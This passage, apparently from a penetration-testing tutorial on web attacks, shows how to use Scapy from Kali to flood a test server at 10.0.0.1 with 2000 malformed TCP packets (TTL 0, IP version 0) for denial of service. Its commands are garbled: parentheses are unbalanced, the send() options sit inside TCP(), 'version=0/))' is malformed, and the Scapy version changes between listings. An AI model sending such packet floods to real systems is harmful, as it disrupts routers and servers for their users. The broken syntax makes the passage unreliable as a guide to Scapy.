  md: 'Web Attacks


    # Scapy


    One of the most popular DoS tools is Scapy. Scapy is a packet manipulation tool
    for computer networks, written in Python by Philippe Biondi. Scapy can forge or
    decode packets, send them on the wire, capture them, and match requests and replies.
    Also, it can handle tasks such as scanning, tracerouting, probing, unit tests,
    attacks, and network discovery.


    One common trick is to manipulate TCP packets from Kali and send it out via Scapy.
    To start Scapy, type scapy in the terminal. Once Scapy has been launched, type
    in command syntax:


    ```

    root@kali:~# scapy

    INFO: Can''t import python pyplot wrapper . Won''t be able to plot.

    WARNING: No route found for IPv6 destination :: (no default route?)

    Welcome to Scapy (2.2.8)

    >>

    ```


    In this following screenshot, we are going to use Scapy to send malformed TCP
    packets to our test server. In this case, our test server is 10.0.0.1. This could
    be a router or a web server. Also, we are going to specify the number of packets
    we will send to our destination. In this case we are sending 2000 packets using
    the command:


    send(IP(dst="10.0.0.1",ttl=0)/TCP(iface="eth0",count=2000)


    In the previous line, we are sending 2000 packets from our eth0 interface on our
    Kali server to the destination address 10.0.0.1. Also, we are sending the target
    to live value of 0. This is pretty much impossible from a TCP standpoint. Essentially,
    we are trying to confuse the web server with a bad TTL value. It should be noted
    that a system under the right circumstances may become corrupt from a single bad
    or malformed packet. We can adjust the count or other parameters we need for our
    attack:


    ```

    root@kali:~# scapy

    INFO: Can''t import python pyplot wrapper . Won''t be able to plot.

    WARNING: No route found for IPv6 destination :: (no default route?)

    Welcome to Scapy (2.2.0)

    >>> send(IP(dst="10.0.0.1",ttl=0)/TCP(iface="eth0",count=2000)

    ```


    Here are some other attack scenarios shown by Scapy:


    # Bad IP Version


    send(IP(dst="10.0.0.1", src="10.20.30.40", version=0/))

    TCP(dport="www", iface="eth0", count=2000)'
